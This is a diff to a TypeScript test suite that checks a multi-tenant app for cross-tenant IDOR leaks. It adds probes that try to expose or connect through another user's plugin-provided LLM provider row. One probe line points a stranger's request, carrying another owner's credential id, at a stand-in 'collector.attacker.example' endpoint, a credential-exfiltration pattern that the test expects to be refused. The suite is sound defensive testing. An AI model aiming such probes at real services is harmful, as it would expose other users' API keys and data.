@@ -60,6 +60,7 @@ import type {
 } from "@orb/kit/ids";
 import { castId, ID_PREFIX, mintTypeId } from "@orb/kit/ids";
 import type { AutomationService } from "@orb/server/domain/automation";
+import type { ConnectionService } from "@orb/server/domain/connection";
 import { appRouter } from "@orb/server/transport/trpc";
 import { strToU8, zipSync } from "fflate";
 import { describe } from "vitest";
@@ -130,6 +131,10 @@ const MARK = {
   // probes are the transport-tier proof of the whole authority model. The marker rides the plugin's `name`,
   // which `toPluginView` returns verbatim — a leaked `upgrade`/`setGrant` result carries it.
   plugin: "AlphaSecretPlugin",
+  // D147 — the LABEL of a provider row A's enabled plugin contributes. A plugin provider pins its author's
+  // baseUrl, so offering it to a stranger is how the stranger's key ends up on A's host; the label is what a
+  // leaked `providersAvailable` row carries verbatim.
+  pluginProvider: "AlphaSecretProvider",
   // The inference program's `user_connections` row owned by A. The marker rides the LABEL, which
   // `toView` returns verbatim on every connection read — so a leaked `get`/`update`/`capabilities` carries
   // it. This row is the sharpest object on the whole surface: it names a SEALED CREDENTIAL by id, so a
@@ -197,6 +202,10 @@ interface OwnerIds {
   // plugin (D46/D147) — A's real installed plugin. Its whole authority model is `getById(db, caller.userId,
   // pluginId)`, so a stranger holding this id is the exact shape the belt exists to refuse.
   pluginId: PluginId;
+  // D147 — A's SECOND plugin, enabled, and the provider row it contributes. Kept apart from `pluginId`, whose
+  // post-sweep pins require it to stay disabled. The provider id is what the stranger's providerId doors aim at.
+  providerPluginId: PluginId;
+  pluginProviderId: ProviderId;
   // #26 — A's saved party; every rosterPreset verb derives authority from `roster_presets.ownerId`, so a
   // stranger passing this id must collapse to leak-free NOT_FOUND.
   rosterPresetId: RosterPresetId;
@@ -255,6 +264,8 @@ const CONNECTION_NOT_YOURS: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_
 const CONNECTION_CREDENTIAL_FOREIGN: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_OP_CODES.credentialForeign };
 /** "that binding actor (a rule / a plugin) is not yours, or there is no such actor". */
 const CONNECTION_ACTOR_FOREIGN: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_OP_CODES.actorForeign };
+/** "you may not use that provider": unregistered, or a plugin row none of your enabled installs contributes (D147). */
+const CONNECTION_PROVIDER_UNKNOWN: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_OP_CODES.providerUnknown };
 
 /**
  * The uniform leak-free VERDICT for ONE stranger probe (pure — the sweep collects verdicts then asserts once,
@@ -1711,6 +1722,21 @@ const PROBES: readonly Probe[] = [
       c.connection.draftCatalogModels({ providerId: "custom-openai", baseUrl: "https://collector.attacker.example/v1", credentialId: i.credentialId }),
     refusal: CONNECTION_CREDENTIAL_FOREIGN,
   },
+  // The PROVIDER axis (D147). A plugin provider row is usable only by the owners of the enabled installs that
+  // contribute it, and it pins its author's baseUrl — so offering A's row to the stranger, or admitting it at a
+  // providerId door, sends the stranger's typed key to A's host. `providersAvailable` takes no input and is
+  // probed through the row's LABEL marker; the two doors must refuse before any dial.
+  { path: "connection.providersAvailable", call: (c) => c.connection.providersAvailable() },
+  {
+    path: "connection.create",
+    call: (c, i) => c.connection.create({ label: ATTACKER_TEXT, providerId: i.pluginProviderId, credentialId: null, baseUrl: null, model: "x" }),
+    refusal: CONNECTION_PROVIDER_UNKNOWN,
+  },
+  {
+    path: "connection.draftCatalogModels",
+    call: (c, i) => c.connection.draftCatalogModels({ providerId: i.pluginProviderId, key: ATTACKER_TEXT }),
+    refusal: CONNECTION_PROVIDER_UNKNOWN,
+  },
   // The ACTOR axis: a binding list may be read for a rule/plugin actor, and the actor must be the caller's
   // (`ruleOwnedBy`). A's automation rule is the foreign actor here. The no-actor arm is self-scoped (the
   // caller's own `user` bindings) and carries no foreign id, so this row is the whole cross-tenant surface.
@@ -1868,11 +1894,6 @@ const EXEMPT: Readonly<Record<string, string>> = {
     "self-scoped: folds the caller's OWN `chat` binding through the runtime resolver from principal.userId — " +
     "NO input at all (no caller-supplied user id/role/connection id), so there is no foreign id to probe",
   "connection.list": "self-scoped: takes NO input; listOwnedConnections filters WHERE user_connections.owner_id = principal.userId",
-  // The provider REGISTRY, not a user's rows: built-ins ∪ the admin/plugin rows, each with its wire's build
-  // state. No input, no owned row, and every authenticated caller is answered identically — a provider a
-  // principal cannot use is LISTED DISABLED rather than hidden (§5.3a), so even the shape carries no tenant
-  // signal. Its two WRITE doors are adminProcedure and exempt below.
-  "connection.providersAvailable": "deployment-global: the provider registry + per-wire build state; no input, no owned row, identical for every caller",
   // The multiplexed socket (SSE-1). `attach`/`detach` are ordinary mutations and ARE probed below. `connect`
   // is the one EventSource and NEVER TERMINATES, so the sweep's drain would hang on it — the exemption is the
   // same one every other subscription here carries. Its cross-tenant teeth are a dedicated unit test: a
@@ -2003,7 +2024,12 @@ describe("cross-tenant IDOR sweep — the completeness guard (grows with the rou
 
 describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for a stranger", () => {
   /** Seed owner A's one-of-everything (front door where possible; direct db for the turn-engine-bound rows). */
-  async function seedOwnerWorld(owner: AppCaller, db: Parameters<typeof seedChat>[0], automation: AutomationService): Promise<OwnerIds> {
+  async function seedOwnerWorld(
+    owner: AppCaller,
+    db: Parameters<typeof seedChat>[0],
+    automation: AutomationService,
+    connectionService: Pick<ConnectionService, "registerPluginProviders">,
+  ): Promise<OwnerIds> {
     const character = await owner.character.create({
       input: { handle: "alpha-hero", name: MARK.character, description: "owned by A" },
     });
@@ -2295,6 +2321,61 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
       updatedAt: 1,
     });
 
+    // ── D147 — A's ENABLED provider plugin and the provider row it contributes. The plugin row is seeded
+    //    directly for the reason above; the contribution goes through the REAL connection door
+    //    (`registerPluginProviders` → `provider_rows` + `plugin_provider_contributions` → the live registry),
+    //    which is the exact path an activation takes. The row relabels a hosted API and pins A's host. ──
+    const providerAssetId = castId<AssetId>("asset_alpha_provider_bundle");
+    await db
+      .insert(assets)
+      .values({ id: providerAssetId, ownerId: OWNER_USER_ID, kind: "plugin", mime: "application/zip", size: 64, hash: "alpha-provider-hash", uploadedAt: 1 });
+    const providerPluginId = mintTypeId(ID_PREFIX.plugin);
+    const pluginProviderId = castId<ProviderId>("plugin:alpha-relay/hosted");
+    await db.insert(plugins).values({
+      id: providerPluginId,
+      ownerId: OWNER_USER_ID,
+      slug: "alpha-relay",
+      name: "alpha relay",
+      version: "1.0.0",
+      manifest: {
+        id: "alpha-relay",
+        name: "alpha relay",
+        version: "1.0.0",
+        hostVersion: 1,
+        entry: "main.js",
+        description: "owned by A",
+        capabilities: ["net.fetch"],
+        netHosts: ["relay.alpha.example"],
+      },
+      bundleAssetId: providerAssetId,
+      grantedCapabilities: ["net.fetch"],
+      status: "enabled",
+      origin: "upload",
+      pendingReconsent: false,
+      widenedNetHosts: [],
+      consecutiveCrashes: 0,
+      lastError: null,
+      installedAt: 1,
+      updatedAt: 1,
+    });
+    await connectionService.registerPluginProviders({
+      pluginId: providerPluginId,
+      pluginName: "alpha-relay",
+      rows: [
+        {
+          id: pluginProviderId,
+          label: MARK.pluginProvider,
+          wire: "openai-compat",
+          dialect: "openai-compatible",
+          auth: "apiKey",
+          baseUrl: "https://relay.alpha.example/v1",
+          apis: ["chat-completions"],
+          catalog: "url",
+          metered: false,
+        },
+      ],
+    });
+
     // #1627 — a durable row in A's INBOX, seeded DIRECTLY: notifications are raised by PRODUCERS (a
     // membership transition, a crashing plugin, an auto-disabling rule) and there is no front-door write
     // verb, which is exactly why the trio's only belt is the recipient predicate. The `automation-notice`
@@ -2362,17 +2443,21 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
       refinerySessionId: refinerySession.id,
       refinerySchemaId: refinerySchema.id,
       pluginId,
+      providerPluginId,
+      pluginProviderId,
       rosterPresetId: rosterPreset.id,
       notificationId,
     };
   }
 
   test("owner A sees its own marker (the leak-detector has teeth) but a stranger never does", async ({ db, ownerCaller, otherCaller, services }) => {
-    const ids = await seedOwnerWorld(ownerCaller, db, services.automation);
+    const ids = await seedOwnerWorld(ownerCaller, db, services.automation, services.connection);
 
     // CONTROL: the owner's OWN read carries the marker — proving the detector below is not blind.
     const ownView = JSON.stringify(await ownerCaller.character.get({ characterId: ids.characterId }));
     expect(ownView).toContain(MARK.character);
+    // …and the installer IS offered its own plugin provider, so the providersAvailable probe has a marker to leak.
+    expect(JSON.stringify(await ownerCaller.connection.providersAvailable())).toContain(MARK.pluginProvider);
 
     // THE SWEEP: every id-taking procedure, probed as the stranger, must be leak-free. Verdicts are
     // collected then asserted ONCE (no branching expect) so EVERY leak surfaces in a single readable diff.
@@ -2466,8 +2551,9 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
     // plugin (D147): every one of the four probes is a WRITE that returns void or a view, so A's row is the
     // only evidence a silent IDOR would leave — and each field below is moved by a DIFFERENT probe, which is
     // why they are asserted separately rather than as one object compare.
-    const pluginStill = await ownerCaller.plugin.list();
-    expect(pluginStill.map((p) => p.id)).toEqual([ids.pluginId]); // survived the stranger's uninstall
+    const pluginsAll = await ownerCaller.plugin.list();
+    expect(pluginsAll.map((p) => p.id).toSorted()).toEqual([ids.pluginId, ids.providerPluginId].toSorted()); // survived the stranger's uninstall
+    const pluginStill = pluginsAll.filter((p) => p.id === ids.pluginId);
     expect(pluginStill[0]?.version).toBe("1.0.0"); // the stranger's 9.9.9 bundle never swapped A's code
     expect(pluginStill[0]?.name).toBe(MARK.plugin); // …nor its manifest-derived name
     expect(pluginStill[0]?.grantedCapabilities).toEqual(["chat.read"]); // setGrant never widened A's grant
@@ -2490,6 +2576,8 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
     // A's connection is keyless, so ANY row naming A's credential is one the stranger's `connection.create`
     // probe minted — the whole point of the credential-reach belt (`credentialOwned`).
     expect((await db.select().from(userConnections)).filter((row) => row.credentialId === ids.credentialId)).toEqual([]);
+    // D147: no connection anywhere names A's plugin provider — the stranger's `create` on it never landed.
+    expect((await db.select().from(userConnections)).filter((row) => row.providerId === ids.pluginProviderId)).toEqual([]);
 
     // ── #755 — WRITE-authority for the owner-scoped E5 candidates the marker detector is STRUCTURALLY BLIND
     //    to. An UPDATE probe OVERWRITES A's marker field with the attacker's value ("hacked"), and a DELETE
